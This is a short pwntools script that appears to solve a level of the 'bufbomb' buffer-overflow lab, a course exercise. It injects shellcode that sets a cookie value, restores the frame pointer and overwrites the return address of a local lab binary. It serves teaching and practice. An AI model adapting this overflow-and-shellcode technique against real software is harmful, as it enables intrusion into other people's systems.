from pwn import *

f = open("./ID", "r")
id = f.read().splitlines()[0]
f.close()

sh = process(['./bufbomb', '-u', id])

length = 32
ebp = 0x556834a0
ret = 0x08048e81
cookie = 0x274adc8a
distance = 0x28 # distance from esp to previous ebp

shellcode = asm('mov eax, ' + str(cookie) + '; lea ebp, [esp + ' + str(distance) + ']; push ' + str(ret) + '; ret;')

exploit = flat([shellcode.ljust(length + 8, 'a'), 0xdeadbeef, ebp - length - 8])

print ' '.join(char.encode("hex") for char in exploit)

sh.sendline(exploit)

sh.interactive()
